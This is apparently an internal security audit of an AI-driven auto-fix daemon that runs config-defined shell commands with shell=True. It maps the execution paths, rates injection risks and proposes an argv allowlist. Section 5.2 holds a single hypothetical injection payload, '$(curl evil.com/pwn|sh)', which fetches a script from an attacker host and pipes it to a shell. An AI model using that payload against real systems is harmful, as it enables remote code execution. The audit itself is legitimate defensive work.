# AI Overseer Autonomous Shell Execution Governance Audit - Phase 1

**Worker-Lane**: W9
**Type**: Security/Governance Audit (Read-Only)
**Base**: b69ec06598fedb4ac79ce534cf30a19f7631e369 (origin/main)
**Date**: 2026-06-07
**Status**: COMPLETE

---

## Executive Summary

This audit examines the AI Overseer autonomous shell execution surface to determine
whether code-enforced policy boundaries exist for autonomous remediation actions.

**Verdict**: GAP_CONFIRMED_BOUNDED

The auto-fix system has functional autonomy but lacks typed policy enforcement.
Commands are bound to static JSON config strings with `shell=True` execution.
Variable substitution from log-derived regex matches creates a bounded but
unverified injection surface.

---

## 1. HoloIndex Pre-Work Summary

| Query | Hits | Key Findings |
|-------|------|--------------|
| AI Overseer auto fix shell command subprocess run fix_command | 10 | ai_overseer.py, autonomous_refactoring.py |
| daemon monitor regex auto_fix fix_command skillz json | 10 | holo_telemetry_monitor.py, wre_skills_loader.py |
| WSP 97 autonomous shell execution code enforced allowlist | 10 | WSP_97, WSP_74, WSP_64 |
| AI Overseer shell=True subprocess governance | 10 | ai_overseer.py (3 hits) |
| requires_012 autonomous remediation preflight_resolution | 10 | action_pattern_learner.py, WSP_36, WSP_48 |

---

## 2. Shell Execution Paths Identified

### 2.1 Primary Auto-Fix Path (daemon_monitor_mixin.py)

**File**: `modules/ai_intelligence/ai_overseer/src/daemon_monitor_mixin.py`

**Lines 329-335**:
```python
result = subprocess.run(
    fix_command,
    shell=True,
    capture_output=True,
    text=True,
    timeout=30,
)
```

**Trigger chain**:
1. `monitor_daemon()` called with skill_path JSON
2. `_gemma_detect_errors()` matches regex patterns against bash_output
3. `_qwen_classify_bugs()` checks `qwen_action == "auto_fix"`
4. `_apply_auto_fix()` extracts `fix_command` from skill config
5. `subprocess.run(fix_command, shell=True)` executes

**fix_action handlers with shell execution**:
- `run_reauthorization_script` (line 315)
- `install_missing_library` (line 315)
- `trigger_next_rotation` (line 443-464)

### 2.2 Secondary Auto-Fix Path (ai_overseer.py)

**File**: `modules/ai_intelligence/ai_overseer/src/ai_overseer.py`

**Lines 2659-2665**:
```python
result = subprocess.run(
    fix_command,
    shell=True,
    capture_output=True,
    text=True,
    timeout=30
)
```

Duplicated implementation of `_apply_auto_fix()` in main class.

### 2.3 Non-Auto-Fix Shell Paths

| File | Line | Usage | shell=True |
|------|------|-------|------------|
| ai_overseer.py | 1842 | git status | NO |
| ai_overseer.py | 1910 | git status | NO |
| ai_overseer.py | 2228 | holo_index.py --index-wsp | NO |
| ai_overseer.py | 2243 | holo_index.py --search | NO |
| daemon_monitor_mixin.py | 807 | rotation_supervisor | YES |
| wardrobe_commit_organizer.py | 165 | git status | NO |
| wardrobe_commit_organizer.py | 386 | git add/commit | NO |
| ii_agent_adapter.py | 74 | II-Agent CLI | NO |
| ii_agent_adapter.py | 108 | LLM start script | NO |
| db_gitignore_guard.py | 33 | git add | NO |
| agent_work_batcher executor.py | 199 | skill CLI | NO |

---

## 3. Command Provenance Classification

### 3.1 fix_command Sources

| Source | Provenance | Risk Level |
|--------|------------|------------|
| youtube_daemon_monitor.json | Repo-owned static config | LOW |
| colab_training_export.json | Training data (no fix_command) | NONE |

**Sole live config**: `modules/communication/livechat/skillz/youtube_daemon_monitor.json`

### 3.2 Static Commands in Config

```json
{
  "oauth_revoked": {
    "fix_action": "run_reauthorization_script",
    "fix_command": "python modules/platform_integration/youtube_auth/scripts/reauthorize_set1.py"
  },
  "rotation_stall_detected": {
    "fix_action": "trigger_next_rotation",
    "fix_commands": {
      "chrome_comments": "python -m modules.communication.livechat.src.rotation_supervisor --browser chrome --operation comments --timeout 300",
      "edge_comments": "python -m modules.communication.livechat.src.rotation_supervisor --browser edge --operation comments --timeout 300",
      "chrome_shorts": "python -m modules.communication.livechat.src.rotation_supervisor --browser chrome --operation shorts --timeout 300",
      "edge_shorts": "python -m modules.communication.livechat.src.rotation_supervisor --browser edge --operation shorts --timeout 300"
    }
  }
}
```

### 3.3 Variable Substitution Analysis

**daemon_monitor_mixin.py lines 321-327**:
```python
if "$1" in fix_command and "matches" in bug:
    matches = bug.get("matches", [])
    if matches and len(matches) > 0:
        library_name = matches[0] if isinstance(matches[0], str) else str(matches[0])
        fix_command = fix_command.replace("$1", library_name.strip())
```

**Substitution provenance**: Regex capture groups from daemon log output.

**Current usage**: No `fix_command` with `$1` exists in committed config files.
The `install_missing_library` action is referenced in code but no skill JSON
defines it with a `$1` placeholder.

---

## 4. Question Matrix

| # | Question | Finding |
|---|----------|---------|
| 1 | What code paths can execute shell commands? | 3 paths: daemon_monitor_mixin._apply_auto_fix (2 locations), check_rotation_stalls |
| 2 | What exact triggers reach those paths? | Regex match on bash_output + qwen_action=auto_fix + fix_action handler |
| 3 | What is the provenance of every fix_command? | Repo-owned JSON config (youtube_daemon_monitor.json) |
| 4 | Are commands fixed/dynamic/model-generated? | Fixed static strings in JSON; no model-generated commands |
| 5 | Does any command use $1/format strings? | Code supports $1 substitution but no config uses it |
| 6 | Is command selection bounded to static keys? | YES - fix_action must match hardcoded handler |
| 7 | Is shell=True used? | YES - 3 subprocess calls |
| 8 | Is there a typed allowlist? | NO - free-form shell strings |
| 9 | Can config expand authority without tests failing? | YES - no test asserts against command contents |
| 10 | Credential-adjacent actions reachable? | OAuth reauth script, rotation supervisor - bounded scope |
| 11 | Duplicate paths semantically identical? | YES - ai_overseer.py and daemon_monitor_mixin.py have duplicated _apply_auto_fix |
| 12 | Is .backup code importable/executable? | INERT - ai_overseer.py.backup not on import path |
| 13 | Are outcomes logged with evidence? | YES - MetricsAppender tracks all fix attempts |
| 14 | Are failures fail-closed? | YES - exception returns success=False, no fallback |
| 15 | Minimal remediation preserving autonomy? | Typed FixAction enum with argv-list allowlist |

---

## 5. Adversarial Exploit Path Analysis

### 5.1 Malicious Repo Skill JSON

**Attack**: PR adds new skill JSON with malicious fix_command.

**Defense**: fix_action must match hardcoded handler (line 315, 367, 414, 443, 496).
Unknown fix_action returns error with no execution.

**Verdict**: BLOCKED by handler whitelist.

### 5.2 Log-Injection Trigger

**Attack**: Malicious log line matches regex to inject shell metacharacters.

**Defense**: $1 substitution only replaces library name; shell=True still dangerous.
Library name from regex group could contain shell metacharacters.

**Example exploit (hypothetical)**:
```
ERROR - $(curl evil.com/pwn|sh) library not installed
```
If matched by regex `(\S+) library not installed`, $1 becomes attack payload.

**Verdict**: GAP - No sanitization on substituted values.

### 5.3 Command-Key Rotation Abuse

**Attack**: Add new key to fix_commands dict to execute arbitrary command.

**Defense**: trigger_next_rotation uses fix_commands.get(cmd_key) with fallback.
New keys require config change + code handler match.

**Verdict**: BLOCKED by handler whitelist.

### 5.4 Shell Metacharacter Injection

**Attack**: Inject via $1 substitution in fix_command.

**Defense**: .strip() only removes whitespace, not shell metacharacters.

**Verdict**: GAP - No shell escaping or validation.

### 5.5 Stale Backup Path Invocation

**Attack**: Import from .backup file.

**Defense**: .backup extension not on Python import path.

**Verdict**: INERT.

### 5.6 Model Output Becoming Command Text

**Attack**: Qwen/Gemma output flows to fix_command.

**Defense**: fix_command sourced from static JSON config, not model output.
qwen_action is config-driven classification, not model-generated text.

**Verdict**: BLOCKED by provenance chain.

### 5.7 External Agent Launch via Auto-Fix

**Attack**: fix_command spawns external agent.

**Defense**: Current commands limited to OAuth reauth and rotation_supervisor.
New commands require explicit handler code.

**Verdict**: BOUNDED by handler whitelist.

### 5.8 Credential-Adjacent Script Execution

**Attack**: OAuth reauth script accesses credentials.

**Defense**: Script path hardcoded to youtube_auth module.
Script is repo-owned and reviewed.

**Verdict**: BOUNDED - acceptable operational scope.

---

## 6. Gaps Confirmed

### GAP-1: shell=True with Unsanitized Substitution

**Location**: daemon_monitor_mixin.py:327
**Severity**: MEDIUM
**Description**: $1 substitution from regex match without shell escaping.
**Current exposure**: No config uses $1. Latent vulnerability.

### GAP-2: Free-Form Shell Strings

**Location**: youtube_daemon_monitor.json fix_command values
**Severity**: LOW
**Description**: Commands are arbitrary shell strings, not typed actions.
**Current exposure**: Commands are static and repo-owned.

### GAP-3: Duplicate Implementation

**Location**: ai_overseer.py and daemon_monitor_mixin.py
**Severity**: LOW
**Description**: _apply_auto_fix duplicated, risking divergence.
**Current exposure**: Code appears semantically identical.

### GAP-4: No Config Change Test Guard

**Location**: tests/test_ai_overseer_monitoring.py
**Severity**: MEDIUM
**Description**: Tests do not assert fix_command contents or block new commands.
**Current exposure**: Config changes could expand attack surface.

---

## 7. Verdict

**GAP_CONFIRMED_BOUNDED**

The auto-fix system operates autonomously within bounded constraints:
- fix_action handlers are hardcoded (whitelist)
- fix_command sources are repo-owned static JSON
- Model output does not flow to command text
- Failures are fail-closed
- Metrics log all executions

However, code-enforced policy boundaries are incomplete:
- shell=True enables injection via $1 substitution
- No typed FixAction enum or argv-list allowlist
- No test guards against config expansion

---

## 8. Recommended Remediation (Phase 2)

### 8.1 Typed FixAction Allowlist

```python
from enum import Enum
from typing import List

class FixAction(Enum):
    OAUTH_REAUTH = "oauth_reauth"
    ROTATION_TRIGGER = "rotation_trigger"
    API_ROTATION = "api_rotation"
    SERVICE_RECONNECT = "service_reconnect"

FIX_ACTION_ALLOWLIST: dict[FixAction, List[str]] = {
    FixAction.OAUTH_REAUTH: [
        "python",
        "modules/platform_integration/youtube_auth/scripts/reauthorize_set1.py"
    ],
    FixAction.ROTATION_TRIGGER: [
        "python", "-m",
        "modules.communication.livechat.src.rotation_supervisor",
        "--browser", "{browser}",
        "--operation", "{operation}",
        "--timeout", "300"
    ],
}
```

### 8.2 Remove shell=True

Replace:
```python
subprocess.run(fix_command, shell=True, ...)
```

With:
```python
argv = FIX_ACTION_ALLOWLIST[fix_action_enum]
argv = [arg.format(**safe_params) for arg in argv]
subprocess.run(argv, shell=False, ...)
```

### 8.3 Add Config Guard Test

```python
def test_fix_command_allowlist_coverage():
    """Ensure all fix_commands are in typed allowlist."""
    skill = load_skill("youtube_daemon_monitor.json")
    for pattern in skill["error_patterns"].values():
        fix_cmd = pattern.get("fix_command")
        if fix_cmd:
            assert fix_cmd in APPROVED_COMMANDS
```

### 8.4 Consolidate Duplicate Code

Merge ai_overseer.py _apply_auto_fix into daemon_monitor_mixin.py.
Remove duplication per WSP 84.

---

## Addendum: Shell-Exec Surface Classification (LIVE vs DEAD/STALE)

**Added by**: W9 (W10 return action)
**Reason**: The audit must classify EVERY `shell=True` auto-fix surface explicitly
as either a LIVE execution path or a DEAD/STALE duplicate, with grep/import
evidence. `ai_overseer.py.backup` was already classified INERT; `auto_fix_engine.py`
was previously mentioned only once (Section 10, "Extracted auto-fix engine, same
pattern") with no classification and no evidence. This addendum closes that gap.

### A.1 Classification Table (every shell=True auto-fix surface)

| Surface | File:Line | Classification | Evidence |
|---------|-----------|----------------|----------|
| `_apply_auto_fix` primary (subprocess.run shell=True) | `daemon_monitor_mixin.py:329-335` | LIVE_EXEC_SURFACE | Section 2.1 trigger chain; reached via `monitor_daemon()` -> `_apply_auto_fix()` |
| `_apply_auto_fix` library substitution path (shell=True branch) | `daemon_monitor_mixin.py:321-327` | LIVE_EXEC_SURFACE | Section 3.3 $1 substitution feeds the same `subprocess.run(..., shell=True)` |
| `check_rotation_stalls` / rotation_supervisor (shell=True) | `daemon_monitor_mixin.py:807` | LIVE_EXEC_SURFACE | Section 2.3 table row (shell=True YES); `trigger_next_rotation` handler line 443-464 |
| `_apply_auto_fix` duplicate (subprocess.run shell=True) | `ai_overseer.py:2659-2665` | LIVE_EXEC_SURFACE | Section 2.2 duplicated `_apply_auto_fix()` in main class; on Python import path, live |
| `AutoFixEngine` extracted engine (subprocess.run shell=True) | `auto_fix_engine.py:118-124` (`class AutoFixEngine` at `auto_fix_engine.py:19`) | DEAD/STAGING_DUPLICATE_NOT_WIRED | See A.2 grep/import evidence: ZERO production imports |
| `_apply_auto_fix` backup copy | `ai_overseer.py.backup` | DEAD/STALE (inert backup) | Section 5.5 / Q12: `.backup` extension not on Python import path |

### A.2 Evidence: auto_fix_engine.py = DEAD/STAGING_DUPLICATE_NOT_WIRED

Re-confirmed read-only against `origin/main` (no working-tree changes):

Command 1 -- production imports (excludes tests and .backup):
```
git grep -nE "import.*auto_fix_engine|from.*auto_fix_engine" origin/main -- '*.py' ':!**/tests/**' ':!**/*.backup'
```
Result: ZERO matches (exit code 1). No production module imports `auto_fix_engine`.

Command 2 -- all references to the symbol anywhere in the tree:
```
git grep -nE "auto_fix_engine|AutoFixEngine" origin/main
```
Result: references appear ONLY in:
- `modules/ai_intelligence/ai_overseer/REFACTOR_PLAN.md` (the extraction plan that
  *proposes* wiring `from .src.auto_fix_engine import AutoFixEngine` -- not yet done)
- `modules/ai_intelligence/ai_overseer/src/auto_fix_engine.py:19` (the file's own
  `class AutoFixEngine` definition)
- audit docs (this audit and `OLLAMA_LAUNCH_AGENT_CAPABILITY_GOVERNANCE_AUDIT_PHASE1.md`)

**Conclusion**: `auto_fix_engine.py` is an extracted-but-unwired refactor artifact.
It contains `shell=True` code (`auto_fix_engine.py:118-124`) but has NO live caller:
the only `import`/instantiation references live in `REFACTOR_PLAN.md` (a plan, not
executed code). It is therefore DEAD/STAGING_DUPLICATE_NOT_WIRED, not a live path.

### A.3 Live-path count clarification

The audit's "3 paths" (Section 4, Question 1) refers strictly to the LIVE execution
paths: `daemon_monitor_mixin._apply_auto_fix` (2 locations) plus `check_rotation_stalls`.
The duplicate live surface `ai_overseer.py:2659` `_apply_auto_fix` (Section 2.2) is the
same family of live paths via the duplicated implementation.

`auto_fix_engine.py` and `ai_overseer.py.backup` are recorded SEPARATELY in A.1 as
dead/stale duplicate code. They are NOT counted among the live paths and they are NOT
ignored -- they are explicitly classified as non-live shell-exec surfaces.

### A.4 Remediation implication

Because both dead/stale duplicates contain `shell=True` code, the remediation slice
(`AI_OVERSEER_AUTOFIX_SHELL_EXEC_REMEDIATION_PHASE1`) must ALSO disable/delete or
prove-unreachable these duplicates, so they cannot become live re-entry points:
- `auto_fix_engine.py`: delete the unwired artifact, or harden it to the same typed
  FixAction allowlist (Section 8.1) before any future wiring, so a later import cannot
  reintroduce a `shell=True` surface.
- `ai_overseer.py.backup`: delete the inert backup (it must remain off the import path
  and should not be revived as-is).

---

## 9. Truth Boundary Checklist

Declared count: 13 items

| # | Truth Boundary Checklist Item | Status | Evidence |
|---|-------------------------------|--------|----------|
| 1 | NO_CODE_MUTATION | YES | Read-only audit, no source changes |
| 2 | NO_TEST_MUTATION | YES | No test files modified |
| 3 | NO_CONFIG_MUTATION | YES | No JSON/YAML changes |
| 4 | NO_SECRETS_EXPOSURE | YES | No credentials displayed |
| 5 | NO_RUNTIME_LAUNCH | YES | No subprocess/daemon executed |
| 6 | NO_WSP_MUTATION | YES | No WSP framework changes |
| 7 | HOLOINDEX_FIRST | YES | 5 HoloIndex queries documented |
| 8 | EVIDENCE_CITED | YES | Line numbers and file paths provided |
| 9 | ADVERSARIAL_ANALYSIS | YES | 8 exploit paths evaluated |
| 10 | VERDICT_STATED | YES | GAP_CONFIRMED_BOUNDED |
| 11 | REMEDIATION_SCOPED | YES | 4 remediation items defined |
| 12 | ASCII_CLEAN | YES | No non-ASCII characters |
| 13 | DEAD_STALE_DUPLICATES_CLASSIFIED_WITH_EVIDENCE | YES | auto_fix_engine.py (0 prod imports; REFACTOR_PLAN.md only) DEAD; ai_overseer.py.backup INERT (not importable) |

Actual rows: 13

---

## 10. Files Inspected

| File | Lines Inspected | Finding |
|------|-----------------|---------|
| daemon_monitor_mixin.py | 1-823 | Primary shell exec path with $1 substitution |
| ai_overseer.py | 1-3000 | Secondary shell exec path, duplicate code |
| auto_fix_engine.py | 1-497 | Extracted auto-fix engine, same pattern |
| ai_overseer.py.backup | 1-200 | Inert backup, not importable |
| youtube_daemon_monitor.json | 1-211 | Sole fix_command config source |
| colab_training_export.json | 1-100 | Training data, no fix_command |
| wardrobe_commit_organizer.py | 160-210 | git commands, no shell=True |
| ii_agent_adapter.py | 65-125 | CLI exec, no shell=True |
| test_missing_library_detection.py | 1-70 | No shell=True assertion |

---

## 11. Conclusion

The AI Overseer auto-fix system is designed for bounded autonomous operation
with static command provenance and hardcoded action handlers. The absence
of 012 approval gates is intentional and appropriate for complexity 1-2
operational fixes.

However, the use of shell=True with potential log-derived substitution
creates a latent injection vulnerability. The recommended remediation
replaces free-form shell strings with typed FixAction enums and argv lists,
removing shell=True while preserving autonomous operation.

**Next slice**: AI_OVERSEER_AUTOFIX_SHELL_EXEC_REMEDIATION_PHASE1
- Implement typed FixAction allowlist
- Remove shell=True from all auto-fix paths
- Add config guard tests
- Consolidate duplicate code
